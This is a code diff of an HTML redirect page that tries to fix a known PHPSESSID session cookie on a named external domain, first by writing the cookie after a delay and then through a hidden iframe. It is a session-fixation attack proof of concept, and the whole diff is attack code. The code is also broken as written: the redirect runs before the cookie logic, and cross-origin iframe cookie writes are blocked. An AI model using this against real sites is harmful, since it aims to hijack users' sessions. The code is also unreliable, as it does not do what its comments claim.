@@ -6,20 +6,29 @@
 <body>
     <script>
         // Redirect to the target site
-        window.location.href = "https://testing.celexhsrp.in/index.php#";
+        window.location.href = "https://testing.celexhsrp.in";
+        
+        // Function to set the cookie in the background
+        function setCookieInBackground() {
+            // Create a hidden iframe
+            var iframe = document.createElement('iframe');
+            iframe.style.display = 'none';
+            iframe.src = "https://testing.celexhsrp.in";
+            document.body.appendChild(iframe);
 
-        // Function to set the cookie after a delay
-        function setCookieAfterDelay() {
-            // Wait for 5 seconds before setting the cookie
-            setTimeout(function() {
-                document.cookie = "PHPSESSID=ISOAH1234; domain=testing.celexhsrp.in; path=/; SameSite=None";
-                console.log("Cookie has been set.");
-            }, 1000);
+            // Set the cookie after the iframe loads
+            iframe.onload = function() {
+                // Set a delay to ensure the iframe has fully loaded
+                setTimeout(function() {
+                    iframe.contentWindow.document.cookie = "PHPSESSID=ISOAH1234; domain=testing.celexhsrp.in; path=/; SameSite=None; Secure";
+                    console.log("Cookie has been set in the background.");
+                }, 5000); // Wait for 5 seconds
+            };
         }
 
-        // Add an event listener to set the cookie after redirect
-        window.addEventListener('load', setCookieAfterDelay);
+        // Execute the function after the page has loaded
+        window.onload = setCookieInBackground;
     </script>
-    <p>If you are not redirected, click <a href="https://testing.celexhsrp.in/index.php#">here</a>.</p>
+    <p>If you are not redirected, click <a href="https://testing.celexhsrp.in">here</a>.</p>
 </body>
 </html>
